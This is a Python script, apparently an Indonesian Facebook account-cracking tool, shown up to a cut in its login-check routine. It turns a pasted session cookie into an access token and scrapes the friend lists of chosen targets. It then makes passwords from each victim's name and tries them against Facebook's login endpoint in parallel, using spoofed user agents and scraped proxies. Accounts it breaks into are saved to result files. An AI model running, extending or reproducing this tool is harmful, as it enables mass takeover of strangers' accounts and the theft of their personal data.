#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re,subprocess,calendar
import urllib3,rich,base64
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from time import sleep
from rich.tree import Tree
from rich.columns import Columns
from rich import print as prints
from time import time as mek
from concurrent.futures import ThreadPoolExecutor as tred
import re,os,sys,rich,bs4,time, json,urllib3,base64,random,datetime,requests
from bs4 import BeautifulSoup as sop
from rich.console import Console as sol
from rich import print as prints
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred
from rich import pretty
from rich.tree import Tree
from rich.table import Table
from rich.text import Text as tekz
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark
from rich import print as cetak
from rich.panel import Panel as panel
from rich.panel import Panel as nel
# APPEND
ses=requests.Session()
id,id2,loop,ok,cp,tokenku,uid= [],[],0,0,0,[],[]
method = []
ualu =[]
ualuh = []
akun = []
printcp = []
redmi = []
uidl =[]
ugen = []
pwpluss,pwnya=[],[]
pretty.install()
id2,uid=[],[]
proxxy,ugen=[],[]
dump,id,akun=[],[],[]
method,tokenku=[],[]
pwpluss,pwnya=[],[]
loop,ok,cp=0,0,0
CON=sol()
console=Console()
ses=requests.Session()
ugen2=[]

#----------[ GET-PROXY ]----------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(proxy)
except Exception as e:
    proxy=open('.prox.txt','r').read().splitlines()
#----------[ USER-AGENT ]----------#	
ugen = []
for xd in range(500):
	rr = random.randint
	az = chr(random.randint(ord('A'), ord('Z')))
	ab = chr(random.randint(ord('A'), ord('Z')))
	a=random.choice(["4","5","6","7","8","9","10","11","12","13","9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	ua = f"Davik/2.1.0 (Linux; U; Android 12; ASUS_AI2201_A Build/SKQ1.220406.001; wv) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/in_US;FBBV/122388438;FBCR/Smart;FBMF/asus;FBBD/asus;FBDV/ASUS_AI2201_A;FBSV/12;FBCA/arm64-v8a:null;FBDM/"+"{density=2.25,height=2048,width=2048};]"
	ua2 = f"Mozilla/5.0 (Windows Mobile 10; {str(rr(1,13))}; Android 10.0; Microsoft; Lumia 950XL){az}{str(rr(111,999))}{ab}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(40,114))}.0.{str(rr(4100,4500))}.{str(rr(30,180))} Mobile Safari/537.36 Edge/40.15254.603"
	ugen.append(ua2)

opera = '''
Opera/9.80 (Tizen; Opera Mini/7.7.18/191.218; U; en) Presto/2.12.423 Version/12.16
Opera/9.80 (Tizen; Opera Mini/7.7.18/191.227; U; en) Presto/2.12.423 Version/12.16	
Opera/9.80 (Tizen; Opera Mini/7.7.18/191.250; U; id) Presto/2.12.423 Version/12.16
Opera/9.80 (Windows Mobile; Opera Mini/7.1.32453/191.218; U; ru) Presto/2.12.423 Version/12.16
Opera/9.80 (Windows Phone; Opera Mini/7.6.8/35.5125; U; ru) Presto/2.8.119 Version/11.10
Opera/9.80 (Windows Phone; Opera Mini/7.6.8/144.30; U; ru) Presto/2.12.423 Version/12.16
Opera/9.80 (Windows Phone; Opera Mini/7.6.8/35.6368; U; ru) Presto/2.8.119 Version/11.10
Opera/9.80 (Windows Phone; Opera Mini/7.6.8/90.169; U; ru) Presto/2.12.423 Version/12.16
Opera/9.80 (Windows Phone; Opera Mini/7.6.8/36.1370; U; ru) Presto/2.12.423 Version/12.16
UCWEB/2.0(Linux; U; Opera Mini/7.1.32052/30.3697; en-US; GT-I9168I Build/JDQ39) U2/1.0.0 UCBrowser/10.8.8.730 Mobile
Opera/9.80 (MTK; Opera Mini/7.0.38784/191.299; U; en) Presto/2.12.423 Version/12.16
Opera/9.80 (Tizen; Opera Mini/7.7.18/191.296; U; en) Presto/2.12.423 Version/12.16
Opera/9.80 (Tizen; Opera Mini/7.7.18/191.304; U; en) Presto/2.12.423 Version/12.16
Opera/9.80 (MTK; Opera Mini/7.0.31498/191.304; U; pt) Presto/2.12.423 Version/12.16
Opera/9.80 (MTK; Opera Mini/7.0.32999/191.308; U; pt) Presto/2.12.423 Version/12.16
'''

uaaloha = []

rr,rc = random.randint,random.choice
for x in range(10000):
	versiandroid = str(rr(4,12))
	versichrome1 = str(rr(0,114))
	versichrome2 = str(rr(100,6000))
	versichrome3 = str(rr(100,200))
	alohabrowser = 'Mozilla/5.0 (Linux; Android CPH1923; {} Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{}.0.{}.{} Mobile Safari/537.36 AlohaLite/1.7.3 AlohaBrowser/4.1.4'.format(versiandroid,versichrome1,versichrome2,versichrome3)
	useragentaloha = random.choice([alohabrowser])
	uaaloha.append(useragentaloha)
	

#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
x = '\33[m' # DEFAULT
### WARNA RANDOM ###
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
P = '\x1b[1;97m' # PUTIH
P2 = "[#FFFFFF]" # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
asu = random.choice([m,k,h,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
asu = random.choice([m,k,h,u,b])
###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_table = "#00C8FF"
except FileNotFoundError:
	color_table = "#00C8FF"
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	colorbapa = random.choice([H2,K2,M2,B2,P2]) 
	color_panel = "#FFFFFF"
import datetime
x = datetime.datetime.now()
jam = x.strftime("%I:%M %p")
pengguna = 'Premium'
#----------[ CONVERTER-BULAN ]----------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

#----------[ GARIS-KERAS ]----------#
def kopi(): 
	print(f"{puti}══════════════════════════════════════════{puti}")
#----------[ KESALAHAN ]----------#	       
def help():
	krek_cer(f"\x1b[1;93m└──\x1b[1;97m[\x1b[1;91m•\x1b[1;97m] pilih yg bener bro :-(")
	login() 

#----------[ MACHINE-SUPPORT ]----------#		
def krek_cer(berjalan):
        for krek_cer in berjalan + "\n":sys.stdout.write(krek_cer);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
#----------[ BANNER ]----------#	
def banner():
		krek_cer(f''' 
        {P}╰•★ S͢I͢M͢P͢L͢E͢ ͢T͢O͢O͢L͢S͢ ͢C͢R͢A͢C͢K͢ ͢F͢A͢C͢E͢B͢O͢O͢K͢ ★•╯
{P} __  __ ___ ___
{b}|  \/  | _ ) __|{P} AUTHOR  : PotraitXD
{p}| |\/| | _ \ _| {P} GITHUB  : Potrait-XD404
{p}|_|  |_|___/_|  {P} VERSION : Update 2,3''')
#----------[ NGECEK COOKIES ]----------#
def login():
	try:
		token = open('.PotraitXDtoken.txt','r').read()
		cok = open('.PotraitXDcok.txt','r').read()
		tokenku.append(token)
		try:
			gass = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			krek = json.loads(gass.text)['id']
			fesbuk = json.loads(gass.text)['name']
			menu(krek,fesbuk)
		except KeyError:
			login_lagi()
		except requests.exceptions.ConnectionError:
			krek_cer(f'{kun}└──{x}[{mer}•{x}]{mer} Koneksi Anda Bermasalah :-( ');exit()
	except IOError:
		login_lagi()
		
#----------[ LOGIN-COOKIES ]----------#		
def login_lagi():
	try:
		os.system('clear');banner()
		print('[+] Author : Potrait-XD - TERMUXSEC\n[+] Status : \033[32mNotCookie\033[0m')
		prints(nel(f'{P2}Masukan cookie anda dulu, Saran ektensi : [green]Cookiedough{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		your_cookies = input(f'{kun}{x}[{hijo}•{x}] Masukan Cookies {hijo}: ')
		with requests.Session() as r:
			try:
				r.headers.update({
				'content-type': 'application/x-www-form-urlencoded',
				})
				data = {
				'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01',
				'scope': ''}
				response = json.loads(r.post(
				'https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = (
				'https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
				})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					krek_cer(f"{kun}└──{x}[{mer}•{x}]{mer} Cookies Anda Invalid :-(", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search(
					'name="fb_dtsg" value="(.*?)"', 
					str(response2)).group(1)
					jazoest = re.search(
					'name="jazoest" value="(\d+)"', 
					str(response2)).group(1)
					data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'qr': 0,'user_code': user_code,}
					r.headers.update({
					'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
					})
					response3 = r.post(
					'https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop(
						'content-type');r.headers.pop(
						'origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search(
						'action="(.*?)"', 
						str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search(
						'name="fb_dtsg" value="(.*?)"', 
						str(response4)).group(1)
						jazoest = re.search(
						'name="jazoest" value="(\d+)"', 
						str(response4)).group(1)
						scope = re.search(
						'name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search(
						'name="display" value="(.*?)"', 
						str(response4)).group(1)
						user_code = re.search(
						'name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search(
						'name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search(
						'name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search(
						'name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search(
						'name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({
						'origin': 'https://m.facebook.com','referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
						})
						data = {
						'fb_dtsg': fb_dtsg,
						'jazoest': jazoest,
						'scope': scope,
						'display': display,
						'user_code': user_code,
						'logger_id': logger_id,
						'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,
						'return_format[]': return_format,}
						response5 = r.post(
						'https://m.facebook.com{}'.format(action), data = data, cookies = {
						'cookie': your_cookies}).text
						windows_referer = re.search(
						'window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop(
						'content-type');r.headers.pop('origin')
						r.headers.update({
						'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
							})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							prints(nel(f'{P2}Token : {K2}{access_token}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
							tokenew = open(".PotraitXDtoken.txt","w").write(access_token)
							cook= open(".PotraitXDcok.txt","w").write(your_cookies)
							prints(nel(f'{H2}Login berhasil tersimpan di .PotraitXD.txt && .PotraitXD.txt{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
			except Exception as e:
				krek_cer(f"{kun}└──{x}[{mer}•{x}]{mer} Login gagal cek tumbal lo ngab :-(")
				os.system('rm -rf .PotraitXDcok && rm -rf .PotraitXDtoken');print(e);time.sleep(3)
				back()
	except:pass
#module tambahan
import socket
import requests
import json
import os 
from rich import print as cetak
from rich.panel import Panel as panel
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)
import requests,re,rich,sys,os,json,time
from concurrent.futures import ThreadPoolExecutor as thread
from rich.markdown import Markdown as mark
from rich import print as cetak
from rich.console import Console as sol
from rich.panel import Panel as nel
ses = requests.Session()
loop = 0
x = '\33[m'
h = '\x1b[1;92m'
m = '\x1b[1;91m'
#bagian menu#
def menu(my_name,my_id):
	try:
		token = open('.PotraitXDtoken.txt','r').read()
		cok = open('.PotraitXDcok.txt','r').read()
	except IOError:
		print('[•] Cookies Kadaluarsa ')
		time.sleep(3)
		login_lagi()
	os.system('clear')
	banner()
	print()
	krek_cer(f'{K} [{P}1{K}]{P} Publik\n{K} [{P}2{K}]{P} Publik Masal\n{K}{P}{K} [{P}0{K}]{P} Logout\n')
	_Gass_nge_krek_ = input(f'{K} {P}»»̵̍̾̕͜Mͪ͆ͧ́ͯͬ̐̂͑͗̓͟͡B̴ͬ́͋̅̾̆ͩͤ͑̏̿́̕͞F̈́̐ͣ̓͆͛ͧ̀̀►{K}{P} Pilih  : ')
	print(f'______________________________________________')
	if _Gass_nge_krek_ in ['1','01']:
		crack_publik()
	elif _Gass_nge_krek_ in ['2','02']:
		publik_massal()
	elif _Gass_nge_krek_ in ['0','00']:
		os.system('rm -rf .PotraitXDcok.txt && rm -rf .PotraitXDtoken.txt')
		krek_cer(f'{kun}└──{x}[{mer}•{x}]{mer} Suckses hapus cookies');back()
		exit
	else:
		krek_cer(f'{K} [{P}•{K}]{P} Pilih Yang Benar Kentod...?')
		time.sleep(4)
		back()
def cek_hasil():
	print(" [01]. hasil CP\n [02]. hasil OK\n")
	_____noah_____ = input(' [*] input : ')
	if _____noah_____ in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(" [*] file tidak di temukan")
			time.sleep(2)
			exit()
		if len(vin)==0:
			print(" [*] file tidak ada")
			time.sleep(2)
			exit()
		else:
			print(' [*] hasil CP\n')
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(' ['+nom+']. '+isi+' ---> '+str(len(hem))+' Akun')
				else:
					lol.update({str(cih):str(isi)})
					print(' ['+str(cih)+']. '+isi+' ---> '+str(len(hem))+' Akun')
			geeh = input(' [*] pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(" [*] pilihan tidak ada")
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				print(" [*] file tidak ada")
				time.sleep(2)
				exit()
			hus = os.system('cd CP && cat '+geh)
			input(" [*] kembali")
			exit()
	elif _____noah_____ in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(" [*] file tidak di temukan")
			time.sleep(2)
			exit()
		if len(vin)==0:
			print (' [*] tidak ada hasil')
			time.sleep(2)
			exit()
		else:
			print(' [*] hasik OK\n')
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(' ['+nom+']. '+isi+' ---> '+str(len(hem))+' Akun')
				else:
					lol.update({str(cih):str(isi)})
					print(' ['+str(cih)+']. '+isi+' ---> '+str(len(hem))+' Akun')
			geeh = input(' [*] pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' [*] pilihan tidak ada')
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				print(' [*] tidak ada hasil')
				time.sleep(2)
				exit()
			hus = os.system('cd OK && cat '+geh)
			input(' [*] kembali')
			exit()
	elif _____noah_____ in ['0','00']:
		exit()
	else:
		print(' [*] pilihan tidak ada')
		exit()

def crack_publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print()
	aink_gabut = input(f'{K} {P}»»̵̍̾̕͜Mͪ͆ͧ́ͯͬ̐̂͑͗̓͟͡B̴ͬ́͋̅̾̆ͩͤ͑̏̿́̕͞F̈́̐ͣ̓͆͛ͧ̀̀►{K}{P} Target : ')
	try:
		aink_raka = ses.get('https://graph.facebook.com/v2.0/'+aink_gabut+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
		for ricode_bang in aink_raka['friends']['data']:
			try:id.append(ricode_bang['id']+'|'+ricode_bang['name'])
			except:continue
		print(f'{K} [{P}•{K}]{P} Total  : '+str(len(id)))
		print(f'{x}______________________________________________')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{K} [{P}•{K}]{P} Koneksi Internet Bermasalah')
	except (KeyError,IOError):
		print (f'{K} [{P}•{K}]{P} Pertemanan Tidak Publik ')
		back()
		
def publik_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f" {K}[{P}•{K}]{P} masukan total target : "))
	except ValueError:
		exit()
	if jum<1 or jum>100:
		print(f" {K}[{P}•{K}]{P} except")
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f' {K}[{P}•{K}]{P} masukan id : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:exit()
	try:
		#print('')
		print(f' {K}[{P}•{K}]{P} berhasil mengumpulkan '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" {K}[{P}•{K}]{P}ConnectionError ")
		exit()
	except (KeyError,IOError):
		print(f' {K}[{P}•{K}]{P} except')
		time.sleep(3)
		exit()

def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = [" iqbal"," kami"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	nam = input(" [*] masukan nama : ").split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  print(f' [*] berhasil mengumpulkan '+str(len(id)))
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")

def setting():
	print('')
	print(f' {K}[{P}1{K}]{P} Idz New\n{K} [{P}2{K}]{P} Idz Old\n{K}{P}{K} [{P}3{K}]{P} Idz Random\n')
	hu = input(f'{K} [{P}•{K}]{P} Input Idz : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f'{K} [{P}•{K}]{P} Input Keluar ')
		setting()
	print("")
	print(f' {K}[{P}1{K}]{P} Method Validate\n{K} [{P}2{K}]{P} Method Reguler\n{K}{P}{K} [{P}3{K}]{P} Async\n')
	gua=input(f'{K} [{P}•{K}]{P} Input : ')
	if gua in ["1","01"]:
		method.append('validate')
	elif gua in ["2"]:
		method.append('asyc')
	elif gua in ['3']:
		method.append('validate_2')
	else:
		method.append('validate_m')
	pwplus=input(f"{K} [{P}•{K}]{P} tambah password tambahan (y/t) : ")
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f"{K} [{P}•{K}]{P} masukan password tambahan : ")
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	uatambah = input(f'{K} [{P}•{K}]{P} apakah anda ingin menggunakan user agent manual (y/t) : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f'{K} [{P}•{K}]{P} masukan user agent anda : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('')
	print(f' {K}[{P}•{K}]{P} hasil OK Tersimpan Di : OK/%s '%(ok))
	print(f' {K}[{P}•{K}]{P} hasil CP Tersimpan Di : CP/%s '%(cp))
	print("")
	with tred(max_workers=30) as pool:
		for anim in id2:
			idf,nmf = anim.split('|')[0],anim.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append('rancaekek')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append('rancaekek')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'validate' in method:
				pool.submit(validate,idf,pwv)
			elif 'async' in method:
				pool.submit(asyc,idf,pwv,'m.facebook.com')
			elif 'validate_2' in method:
				pool.submit(validate_2,idf,pwv)
			else:
				pool.submit(validate_2,idf,pwv)
	print(" [*] crack telah selesai...")
	exit()

def validate(idf,pwv):
	global loop,ok,cp
	ses = requests.Session()
	ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
	load = random.choice(["🥺","🙄"])
	print(f"\r [{H}{load}{P}] {loop}/{len(id)} OK-:{ok} CP-:{cp}",end=" ");sys.stdout.flush()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			mek = random.randint(11,99)
			wibu = ses.get(f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated').text
			data = {
					"lsd": re.search('name="lsd" value="(.*?)"',str(wibu)).group(1),
					"jazoest": re.search('name="jazoest" value="(.*?)"', str(wibu)).group(1),
					"uid": idf,
					"next": f"https://m.facebook.com/login/save-device/",
					"flow": "login_no_pin",
					"pass": pw
						}
			wibu_head = {
					"host" : "m.facebook.com",
					"accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
					"accept-encoding" : "gzip, deflate, br",
					"accept-language" : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"cache-control" : "max-age=0",
					"content-length" : "277",
					"content-type" : "application/x-www-form-urlencoded",
					"origin" : "m.facebook.com",
					"pragma" : "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace",
					"referer" : f"https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&hbl=0&refsrc=deprecated",
					"sec-ch-ua" : '"Not:A-Brand";v="99", "Chromium";v="112"',
					"sec-ch-ua-full-version-list" : '"Not:A-Brand";v="112.0.0.0", "Chromium";v="112.0.5615.137"',
					"sec-ch-ua-mobile" : "?1",
					"sec-ch-ua-platform" : '"Android"',
					"sec-ch-ua-platform-version" : '"10.0.0"',
					"sec-fetch-dest" : "document",
					"sec-fetch-mode" : "navigate",
					"sec-fetch-site" : "same-origin",
					"sec-fetch-user" : "?1",
					"upgrade-insecure-requests" : "1",
					"user-agent" : f"{ua}"}
			post = ses.post(f"https://m.facebook.com/login/device-based/validate-password/?shbl=0",data=data,headers=wibu_head,allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				print(f"\r{K} * --> {idf}|{pw}")
				open('VALID_CP/'+CP,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
